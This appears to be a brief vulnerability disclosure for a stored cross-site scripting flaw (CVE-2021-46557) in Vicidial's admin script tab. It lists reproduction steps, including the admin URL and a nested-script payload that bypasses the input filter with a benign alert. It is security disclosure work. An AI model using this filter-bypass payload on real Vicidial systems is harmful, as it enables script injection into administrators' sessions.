# Vicidial-stored-XSS (CVE-2021-46557)
Vicidial is vulnerable to stored cross-site-scripting through the script tab inputs

# Reproduce
- go to the vicidial and login 
- then go to /admin.php?ADD=1111111
- in the script tab add the following javascript: "<scr<script>alert(1)</script>ipt>alert<script>alert(1)</script>(1)</scr<script>alert(1)</script>ipt>" 
- now click save, we were able to bypass the filter then view script 
- As you can see the code executed

# PoC
<img src="Screenshot 2022-01-23 090638.png">
